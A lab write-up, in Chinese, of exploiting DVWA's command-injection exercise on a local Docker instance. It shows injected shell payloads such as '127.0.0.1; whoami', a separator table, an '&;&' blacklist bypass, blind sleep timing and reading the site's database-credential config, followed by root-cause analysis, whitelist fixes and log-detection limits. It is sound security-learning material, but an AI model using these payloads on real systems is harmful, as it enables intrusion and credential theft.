# 命令注入（Command Injection）— DVWA

> 靶场：`vulnerables/web-dvwa`（DVWA v1.10 *Development*）
> 难度：Low ✅ ／ Medium ✅ ／ High ⬜
> 日期：2026-09-23 ～ 09-24
> 工具：Burp Suite Community v2026.8

---

## 0. 一句话总结

服务器把用户输入的 IP **直接拼接进一条交给 shell 执行的命令字符串**，
导致用户的输入从「数据」变成了「命令语法」。

---

## 1. 环境

| 项 | 值 |
|---|---|
| 靶场镜像 | `vulnerables/web-dvwa` |
| 启动命令 | `docker run -d --name dvwa --restart unless-stopped -p 127.0.0.1:8080:80 vulnerables/web-dvwa` |
| 入口 | `http://127.0.0.1:8080/vulnerabilities/exec/` |
| 服务端 | Apache 2.4.25 (Debian) ／ PHP 7.0.30 |
| 抓包 | Burp Suite Community v2026.8（代理监听 `127.0.0.1:8081`） |

**端口绑定必须写 `127.0.0.1:`** —— 否则整个校园网都能访问这个**故意有漏洞**的靶场。

---

## 2. 漏洞原理

### 2.0 这一关表面上是干什么的

输入一个 IP 地址，页面返回 `ping` 这个 IP 的结果 —— 一个很普通的网络诊断小工具。

### 2.1 服务端代码（Low）

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

### 2.2 原罪是哪一行

```php
$cmd = shell_exec( 'ping  -c 4 ' . $target );
```

**`$target` 不是「一个参数」，它是「整行命令」的一部分。**

用户输入被 `.` 拼接到命令字符串里，然后**整行**交给 shell。所以输入里的
`;`、`&&`、`|` 这些字符会被 shell 当成**语法**，而不是普通文本。

> **本质：数据被当成了代码。**
> SQL 注入是数据被当成 SQL 语法，XSS 是数据被当成 HTML/JS 语法，
> **命令注入是数据被当成 shell 语法** —— 一类漏洞三种表现。

---

## 3. 复现（Low）

### 3.1 正常使用

输入 `127.0.0.1`，页面返回：

```text
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.113 ms
...
```

**这段文字不是 PHP 写死在页面里的** —— 每次执行的耗时、序号都不同。
它是**服务器上真的运行了 `ping` 这个程序**，输出被 PHP 用 `shell_exec` 捕获后
塞进 `<pre>` 标签回显给我们的。

**看到这段输出，就应该意识到：服务器在替我们执行系统命令。**

### 3.2 注入

**Payload：**

```
127.0.0.1; whoami
```

**原始请求：**（`raw/low-request.txt`）

```http
POST /vulnerabilities/exec/ HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/vulnerabilities/exec/
Cookie: PHPSESSID=v5et1sgl7cfn3oadi66vmo66d6; security=low
Connection: keep-alive

ip=127.0.0.1%3B+whoami&Submit=Submit
```

> `%3B` 就是 `;`，`+` 就是空格。
> form-urlencoded 里特殊字符必须转义，否则 `&` 会被当成字段分隔符、payload 到不了服务器。

**原始响应（关键部分）：**（`raw/low-response.txt`，中间 120 行页面模板已省略）

```http
HTTP/1.1 200 OK
Date: Thu, 24 Sep 2026 02:33:24 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 4608
Content-Type: text/html;charset=utf-8

...

<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.365 ms
...
round-trip min/avg/max/stddev = 0.078/0.158/0.365/0.120 ms
www-data
</pre>
```

**关键就是最后那一行 `www-data`** —— 它是 `whoami` 的输出，
证明服务器执行了**我们指定的命令**，而不只是执行了 `ping`。

**为什么能成功：**

拼接之后，真正交给 shell 的是这一整行：

```text
ping  -c 4 127.0.0.1; whoami
```

`;` 是 shell 的**命令分隔符**，所以 shell 把它解析成**两条独立命令**：

1. `ping -c 4 127.0.0.1`
2. `whoami`

第二条就是我们注入进去的。**我们不是在给 `ping` 传参数，我们是在改写这行命令本身。**

---

## 4. 七种命令连接符对照表

| # | 输入 | 执行 | 输出可见 | 为什么 |
|---|---|---|---|---|
| 1 | `127.0.0.1; whoami` | ✅ | ✅ | `;` 是**命令分隔符**：「执行完前面，接着执行后面」。shell 收到 `ping -c 4 127.0.0.1; whoami`，当成两条独立命令。 |
| 2 | `127.0.0.1 && whoami` | ✅ | ✅ | `&&` 是「**前面成功才执行后面**」。`ping 127.0.0.1` 成功 → `whoami` 被执行。**注意这是顺序关系，不是"一起执行"。** |
| 3 | `127.0.0.1 \|\| whoami` | ❌ | — | `\|\|` 是「**前面失败才执行后面**」。ping 成功 → 后面**不执行**。**这是 shell 短路，不是被过滤器拦住。** |
| 3b | `192.0.2.1 \|\| whoami` | ✅ | ✅ | **对照组**：`192.0.2.1` 是保留的测试网段，ping 不通（失败）→ `\|\|` 后面的 `whoami` 才被执行。这证明第 3 行失败的原因是「短路」而不是「被拦」。 |
| 4 | `127.0.0.1 \| whoami` | ✅ | ✅ 只有 whoami | `\|` 是**管道**：把前一条命令的 stdout 接到后一条的 stdin。`whoami` 不读 stdin，直接输出自己的结果，所以页面上**只有 `www-data`，ping 的输出被吃掉了**。 |
| 5 | `127.0.0.1 & whoami` | ✅ | ✅ 输出交错 | `&` 把前面的命令丢到**后台**执行，shell 立刻接着跑后面那条。两条命令**并发**，输出交错出现（实测 `www-data` 夹在 ping 输出的正中间）。 |
| 6 | ``127.0.0.1 `whoami` `` | ✅ | ❌ | **命令替换**：反引号里的命令先执行，**结果被塞回参数位置**，拼成 `ping -c 4 127.0.0.1www-data`。不是合法主机名，ping 报错走 **stderr**，而 `shell_exec` 只捕获 stdout → 页面上什么都没有。 |
| 7 | `127.0.0.1$(whoami)` | ✅ | ❌ | 同上。`$(...)` 和反引号是命令替换的两种写法，行为一致。 |

### 4.1 第 3 行的陷阱

`||` **没有被过滤** —— Medium 的黑名单里根本没有它。

它「没反应」的原因是 **shell 短路**：`ping 127.0.0.1` 成功返回（退出码 0），
`||` 后面的命令**按语义就不该执行**。

**验证**：把前面的 IP 换成 ping 不通的 `192.0.2.1`（表格第 3b 行），后面的命令立刻执行。

> **「没反应」和「被拦」是两个完全不同的现象，长得却一模一样。**
> 判断错这一条，就会在错误的方向上改 payload —— 明明是短路，你却一直去试别的符号。

### 4.2 第 6、7 行：命令执行了，但看不见

**证据 —— 用耗时证明它真的跑了：**

```text
基准  127.0.0.1           耗时 3.01s      ← ping -c 4 本来就要 3 秒
含    $(sleep 3)          耗时 6.03s      ← 多了正好 3 秒
含    `sleep 3`           耗时 6.02s      ← 也是
```

如果不做这个实验，看到页面空白会误以为「命令没执行」。**耗时说明它执行了。**

**为什么看不见输出：**

命令替换把结果塞进了参数位置，拼出 `ping -c 4 127.0.0.1www-data`。
这不是合法主机名，ping 的报错走 **stderr** —— 而 `shell_exec` **只捕获 stdout，不捕获 stderr**，
所以报错被丢掉了，`<pre>` 里什么也没有。

**怎么让看不见的变可见：**

在输入末尾加 `2>&1`，把 stderr **重定向**到 stdout：

```text
输入: nosuchhost-xyz 2>&1
输出: ping: unknown host
```

> **「没执行」和「执行了但看不见」是两回事。**
> 这个区分是**盲命令注入（blind RCE）**的基础 —— 服务器不给回显时，
> 只能靠**时间**（`sleep`）、靠**外带回连**来判断命令跑没跑。
> 上面那个耗时实验，就是盲注最基本的手法。

---

## 5. Medium：黑名单与绕过

### 5.1 Medium 加了什么防护

```php
$substitutions = array(
    '&&' => '',
    ';'  => '',
);
$target = str_replace( array_keys($substitutions), $substitutions, $target );
```

**一个黑名单，只删两个符号。** 用户输入先被"清洗"，再拼进命令。

### 5.2 解法一：换一个没被拦的符号

黑名单里只有 `&&` 和 `;`，但 shell 的连接符不止这两个。

**直接换 `|`：**

```
127.0.0.1|whoami
```

`|` 不在黑名单里，原样送到 shell → 管道 → `whoami` 执行。

**这是"绕过"，但没什么技术含量** —— 只是"换一个它没写进黑名单的符号"。
一旦黑名单补全，这招就失效。

### 5.3 解法二：双写绕过 ★

**思路：**

Medium 用 `str_replace` 删掉 `&&` 和 `;`。但**实测发现替换是有先后顺序的**：
**先删 `&&`，再删 `;`。**

于是可以构造 `&;&`：

- 它**本身不含 `&&`**（两个 `&` 中间隔着 `;`）→ 第一趟替换碰不到它，原样保留
- 但第二趟删掉 `;` 之后，两个 `&` 就**相邻**了 → 拼出了 `&&`

**过滤器亲手拼出了它本该阻止的东西。**

**推演：**

```text
① 你输入:            127.0.0.1 &;& whoami
② 第一趟删 "&&":      里面没有连续的 &&        →  不变
③ 第二趟删 ";":       & ; &   →   & &          →  变成 127.0.0.1 && whoami
④ shell 收到:        ping -c 4 127.0.0.1 && whoami
⑤ ping 成功 → && 成立 → whoami 执行 → www-data
```

**原始请求：**（`raw/medium-request.txt`）

```http
POST /vulnerabilities/exec/ HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/vulnerabilities/exec/
Cookie: PHPSESSID=v5et1sgl7cfn3oadi66vmo66d6; security=medium
Connection: keep-alive

ip=127.0.0.1+%26%3B%26+whoami&Submit=Submit
```

**原始响应（关键部分）：**（`raw/medium-response.txt`，中间 120 行页面模板已省略）

```http
HTTP/1.1 200 OK
Date: Thu, 24 Sep 2026 02:16:54 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 4617
Content-Type: text/html;charset=utf-8

...

<pre>PING 127.0.0.1 (127.0.0.1): 56 data bytes
...
round-trip min/avg/max/stddev = 0.072/0.100/0.161/0.036 ms
www-data
</pre>
```

> 页面左下角显示 `Security Level: medium` —— 这是 medium 档下打通的证据。

### 5.4 一个反直觉的发现

**`&;&` 在 Low 档反而打不通。**

Low 档没有过滤器，`&;&` 原样交给 shell：

```text
ping -c 4 127.0.0.1 & ; & whoami
                    ↑   ↑
                 后台   分隔符, 后面跟着一个孤零零的 &
```

shell 遇到 `; &` 会报**语法错误**，整行命令挂掉（报错走 stderr，页面空白）。

**所以 `&;&` 能成功，恰恰是因为 Medium 的过滤器"帮"我们把中间的 `;` 删掉了。**

> **一个 payload 能成功，有时不是因为「目标没有防护」，
> 而是因为「防护本身做错了事」。**

**推广：payload 的行为可以当"指纹"**

| 观察到 | 说明目标的防护是 |
|---|---|
| `;` 能过 | 没有过滤，或者过滤的是别的东西 |
| `;` 不行，但 `\|` 行 | 有黑名单，且黑名单里不含 `\|` |
| 只有 `&;&` 能过 | 有「先删 `&&` 再删 `;`」这种**顺序缺陷** |
| 全都不行 | 可能是**白名单**（像 Impossible 档那样拆开验证） |

**用不同的 payload 去试，就能画出目标的过滤规则长什么样** —— 这叫 WAF 指纹识别。

---

## 6. RCE 之后：权限边界 ★

### 6.1 我是什么身份

```text
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ groups
www-data
```

不是 root，是一个专门给 Web 服务器用的低权限账户。

### 6.2 读得了什么

**网站自己的文件都能读** —— 因为它们属于 `www-data`：

```text
$ head -12 /var/www/html/config/config.inc.php
<?php
# ... 数据库连接配置 ...
$DBMS = 'MySQL';
# Database variables
```

**这个文件里有数据库的账号密码。** 拿到它就能去连数据库、把整个用户表拖走 ——
这是渗透里"横向移动"的第一步。

### 6.3 读不了什么

**属于 root 的文件读不了：**

```text
$ wc -l /var/log/apache2/access.log 2>&1
wc: /var/log/apache2/access.log: Permission denied

$ tail -5 /var/log/apache2/access.log 2>&1
tail: cannot open '/var/log/apache2/access.log' for reading: Permission denied

$ ls /var/log/apache2/
ls: cannot open directory '/var/log/apache2/': Permission denied
```

> 顺带一个容易搞混的点：
> `ls` 一个目录需要**目录的读权限**，而 `cat` 一个文件只需要**目录的执行权限 + 文件本身的读权限**。
> 这是两回事。**但这里两种都验证过，都是 Permission denied。**

### 6.4 结论

**拿到命令执行 ≠ 拿到一切。**

我们能在服务器上执行任意命令了，但身份只是 `www-data` ——
一个权限被严格限制的 Web 用户。读不了系统日志，读不了 `/etc/shadow`，
装不了东西，改不了系统配置。

**这就是为什么渗透测试里「提权（Privilege Escalation）」是一个独立的、巨大的阶段。**
从 `www-data` 到 `root`，中间还有一整座山。

---

## 7. 根因

**服务器把用户输入用 `.` 拼接进了一条交给 shell 执行的命令字符串**
（`shell_exec( 'ping  -c 4 ' . $target )`），
**导致用户输入从「数据」变成了「语法」。**

这不是"少做了一次过滤"，而是**架构上的错误**：把不可信的数据和可信的代码
放进了同一个解析上下文里。过滤只是补丁，根治要靠**分离**。

---

## 8. 修复方案

### 8.1 错误做法 —— 为什么"过滤分号"不算修

**Medium 档就是活教材：它过滤了 `&&` 和 `;`，结果我们用 `|` 和 `&;&` 两分钟就绕过了。**

黑名单的根本问题：

1. **你不可能穷举完所有危险输入** —— shell 的连接符有 `;` `&` `&&` `|` `||` 换行 `` ` `` `$()`，
   还有编码、大小写、特殊字符等无穷变体
2. **过滤规则和处理规则的解析顺序不一致**，就会出现 `&;&` 这种"过滤器自己拼出危险字符"的情况
3. **危险的不是字符，是「数据被当成了代码」这件事**

**所以"过滤危险字符"是缓解，不是修复。**

### 8.2 正确做法

DVWA 的 **Impossible 档**用的是**白名单**：

```php
// Get input
$target = $_REQUEST[ 'ip' ];
$target = stripslashes( $target );

// Split the IP into 4 octects
$octet = explode( ".", $target );

// Check IF each octet is an integer
if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) )
 && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) )
 && ( sizeof( $octet ) == 4 ) ) {

    // If all 4 octets are int's put the IP back together.
    $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

    // ... 然后才 shell_exec( 'ping  -c 4 ' . $target );
}
else {
    echo '<pre>ERROR: You have entered an invalid IP.</pre>';
}
```

**（另外它还加了 CSRF token 校验 `checkToken(...)`。）**

**为什么这样能修：**

1. **它不判断"输入里有没有坏东西"，而是判断"输入是不是一个合法 IP"** ——
   白名单 vs 黑名单的根本区别
2. **拆成 4 段逐段验证数字**，任何带 `;` `&` `|` 的输入都会在 `is_numeric` 这一关挂掉
3. **验证通过后重新拼装**，用的是验证过的数字，而不是原始字符串 ——
   **原始输入永远不进命令**

**更彻底的思路（Defense in Depth）：**

- 用 `escapeshellarg()` / `escapeshellcmd()` 转义参数
- **更好的做法是根本不调 shell**：用语言内置的能力代替外部命令
  （比如用 `filter_var($ip, FILTER_VALIDATE_IP)` 校验，用 `socket` 库代替 `ping`）
- **最小权限**：Web 进程不用 root 跑（DVWA 这里做对了，用的是 `www-data`）

---

## 9. 日志特征 ★

### 9.1 这次攻击在 access.log 里长什么样

**命令注入（POST）：**

```text
172.17.0.1 - - [24/Sep/2026:02:33:24 +0000] "POST /vulnerabilities/exec/ HTTP/1.1" 200 1906 "http://127.0.0.1:8080/vulnerabilities/exec/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
```

**暴力破解（GET）—— 同样是我打的，做对比：**

```text
172.17.0.1 - - [23/Sep/2026:15:50:47 +0000] "GET /vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1" 200 1821 "-" "Mozilla/5.0 ..."
```

> **对比结论：**
> 两条都是我自己打的，但日志里的信息量天差地别。
> **GET 那条把密码明文记下来了**（凭据在 URL 里）；
> **POST 这条只有一个路径，`127.0.0.1; whoami` 一个字都没有**（payload 在 body 里，access log 不记 body）。

### 9.2 我自己的检测工具能抓到吗

**抓不到。** 跑 `loganalyze.py` 的真实输出：

```text
总请求数   : 210
跳过行数   : 83
内部连接数 : 7   (OPTIONS *, 服务器自己发的, 不算用户流量)
独立 IP 数 : 1

Top 5 请求路径:
     67  /vulnerabilities/brute/
     67  /vulnerabilities/exec/       ← 命令注入就发生在这里
     29  /login.php
...

可疑行为
==============================================================
[1] 疑似目录扫描(404 次数 >= 10)
    未发现
[2] 疑似暴力破解(打登录路径 >= 10 次)
    未发现
[3] 扫描器特征 User-Agent
    172.17.0.1          87 次命中(该 IP 共 210 次请求)   命中 1 种: python-requests
[4] 敏感路径探测
    未发现
[5] 凭据出现在 URL 中(查询串含 password= , >= 10 次)
    172.17.0.1          64 次
```

**唯一响的 `[3]` 抓的还是测试脚本（`python-requests`），不是我的浏览器攻击。**
**`[2]` 因为路径表里没有 `/vulnerabilities/brute/` 而漏报**（后来靠新增的 `[5]` 补上）。

### 9.3 为什么抓不到（重要）

**`loganalyze.py` 天生抓不到命令注入** —— 这不是规则写得不够多，
而是**数据源本身就没有这个信息**：

> **payload 在 POST body 里，而 access log 只记请求行和请求头，不记 body。**

| 攻击类型 | 数据在日志里吗 | 能靠日志检测吗 |
|---|---|---|
| 暴力破解（GET） | ✅ URL 里有 `password=` | ✅ 能 |
| 命令注入（POST） | ❌ 只有路径，没有 payload | ❌ **不能** |

**要检测 POST 类攻击，必须看请求体** —— 那是 WAF（ModSecurity、云 WAF）的活，
或者去看应用自己的日志（PHP 错误日志、数据库慢查询日志）。

> **能说清「我的检测能力边界在哪、为什么」，比多写三条规则值钱。**
> 这是这条学习路径最核心的一个认知：**先搞清数据源有什么，再谈检测规则。**

### 9.4 改进措施

**针对暴力破解**，新增了一条规则 `[5]`：

```python
# 同一个 IP 这个次数以上出现 "password=" 在 URL 里 -> 疑似爆破
PWD_IN_URL_THRESHOLD = 10
...
if "password=" in target.query.lower():
    ip_pwd[ip] += 1
```

**这条规则的好处：** 它不依赖"路径名叫什么"（`BRUTE_PATHS` 只能写死已知 CMS 的路径），
而是抓**凭据出现在 URL 里**这个通用反模式 —— 既抓到了爆破，又抓到应用设计缺陷本身。

**同时修掉了两个输出层面的缺陷：**

| 问题 | 原因 | 修复 |
|---|---|---|
| `[3]` 报「210 次请求」 | 用的是 `ip_counter[ip]`（该 IP **总**流量），不是命中数 | 新增 `ip_ua_hit` 计数器，只统计真正命中扫描器特征的请求（实测 210 → **87**） |
| `独立 IP 数: 2` | 把 Apache 的 `OPTIONS *` 内部连接（`internal dummy connection`）当成了用户 | 请求目标是 `*` 的直接跳过，单独计入「内部连接数」（实测 2 → **1**） |

**针对命令注入：加不了。** 数据源里没有 payload，规则再怎么写也变不出来。
**这个局限要写清楚，而不是假装能检测。**

---

#### 检测能力的分层（这一节的核心结论）

**先厘清 access log 到底记了什么**（实测，Combined Log Format）：

```
%h %l %u %t "%r" %>s %O "%{Referer}i" "%{User-Agent}i"
                            └────┬────┘ └─────┬──────┘
                        只挑了两个头, 而且只记【值】
```

| 记不记 | 字段 | 验证方式 |
|---|---|---|
| ✅ | 客户端 IP ／ 时间 ／ **请求行** ／ 状态码 ／ 大小 | 每条都有 |
| ✅ | **Referer 的值** | `http://127.0.0.1:8080/vulnerabilities/exec/` 出现 22 次 |
| ✅ | **User-Agent 的值** | `python-requests/2.34.2` 出现 87 次 |
| ❌ | **Cookie 的值** | 搜 `PHPSESSID` → 一条都没有 |
| ❌ | **Content-Type 的值** | 搜 `application/x-www-form-urlencoded` → 一条都没有 |
| ❌ | **请求体** | 所以 POST 的 payload 完全不可见 |

**所以「能不能检测」要分两层看：**

| 层面 | 内容 | 日志里 |
|---|---|---|
| **行为层** | 谁、何时、打了哪个路径、**多少次** | ✅ **永远看得见** |
| **内容层** | 用户名密码、payload 是什么 | ⚠️ **GET 看得见，POST 看不见** |

**由此得到「检测不到」的两种原因，修法完全不同：**

| 攻击 | 败在哪一层 | 改规则能修吗 |
|---|---|---|
| DVWA 的爆破（GET 版） | **规则层** —— `BRUTE_PATHS` 没写对路径 | ✅ 能（加了 `[5]` 就抓到 64 次） |
| 真实站点的爆破（POST 版） | **数据源层** —— 密码看不见，但"打了多少次"看得见 | ⚠️ 部分能（靠频率，抓不到内容） |
| **命令注入（POST）** | **数据源层** —— payload 完全看不见 | ❌ **改规则也没用** |

> **分不清这两层，就会在错误的地方一直加规则。**

#### 那企业靠什么看请求体？

**DVWA 自带的 `PHPIDS` 就是一个小型示范** —— 它的原理是「分析用户提交的请求」，
**请求里包括请求体**。真实企业是同一套思路，只是分层更多：

| 层 | 它看到什么 | 命令注入 | POST 爆破 |
|---|---|---|---|
| **access log** | 请求行 + 2 个头值 | ❌ | ⚠️ 只见频率不见内容 |
| **WAF**（ModSecurity／云 WAF） | **完整请求（含 body）** | ✅ | ✅ |
| **应用日志** | 应用自己记的业务事件 | 看应用记了什么 | ✅ |
| **主机层／EDR** | 进程行为 | ✅（`www-data` 突然 fork 出 `whoami`） | ❌ |

**WAF 是唯一能看见 payload 的那一层** —— 这也解释了为什么「绕过 WAF」是渗透的核心技能。

> **能说清「我的工具能力边界在哪、为什么」，比多写三条规则值钱。**
> 我的工具是纯 access log 分析，**天生看不见 POST body**：
> 能检测 GET 类的扫描和爆破，**检测不了命令注入这类 POST 攻击** ——
> 要覆盖它们得靠 WAF 或主机层日志，那不是我这一层能解决的。

---

## 10. 遗留问题

- [ ] High 档未打（提示：黑名单有 9 项，其中有一项写得很诡异 —— 逐字符读它到底在匹配什么）
- [ ] 未验证 `/var/log/apache2/` 的目录权限具体是多少（只知道 www-data 读不了）
- [ ] 未测试 `escapeshellarg()` 的实际防护效果（只做了理论分析）

---

## 附：环境噪声记录

| 现象 | 原因 | 影响 |
|---|---|---|
| Cookie 头里 `security` 出现两次 | 浏览器里积累了同名 cookie（路径不同）。**实测 PHP 取第一个**，所以 `security=low; ...; security=medium` 生效的是 `low` | 页面提示的难度和实际生效的难度可能不一致 → **每次测试前看左下角的 `Security Level`，别靠记忆** |
| 日志里所有 IP 都是 `172.17.0.1` | Docker 的 **NAT** 把源地址改写成了网关地址（宿主机在容器网络里的身份） | **无法从日志区分攻击者和正常用户**。真实环境里反代后面也一样，要靠 `X-Forwarded-For` —— 而那个头可以伪造 |
| `127.0.0.1` 出现在日志里 7 次 | Apache 的**内部连接**（`OPTIONS *` + UA `internal dummy connection`），用于维护子进程 | 会污染「独立 IP 数」等统计指标 → 已在 `loganalyze.py` 里单独过滤 |
